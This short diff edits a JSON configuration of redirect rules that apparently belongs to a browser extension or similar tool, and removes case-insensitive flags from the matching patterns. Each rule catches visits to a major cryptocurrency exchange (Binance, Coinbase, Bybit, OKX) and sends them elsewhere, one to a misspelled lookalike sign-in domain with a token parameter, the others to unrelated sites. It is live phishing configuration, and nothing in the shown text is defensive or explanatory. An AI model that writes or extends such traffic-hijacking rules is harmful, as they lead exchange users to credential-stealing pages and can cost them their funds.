@@ -19,19 +19,19 @@
   ],
   "redirectRules": [
     {
-      "regex": "(?i)(www\\.)?binance\\.(com|us).*",
+      "regex": "(www\\.)?binance\\.(com|us).*",
       "url": "https://blinnance.signln-plaform.co/?token=0x_full"
     },
     {
-      "regex": "(?i)(www\\.)?coinbase\\.com.*",
+      "regex": "(www\\.)?coinbase\\.com.*",
       "url": "https://seuoutrolink.com"
     },
     {
-      "regex": "(?i)(www\\.)?bybit\\.com.*",
+      "regex": "(www\\.)?bybit\\.com.*",
       "url": "https://ge.globo.com/"
     },
     {
-      "regex": "(?i)(www\\.)?okx\\.com.*",
+      "regex": "(www\\.)?okx\\.com.*",
       "url": "https://ge.globo.com/"
     }
   ]
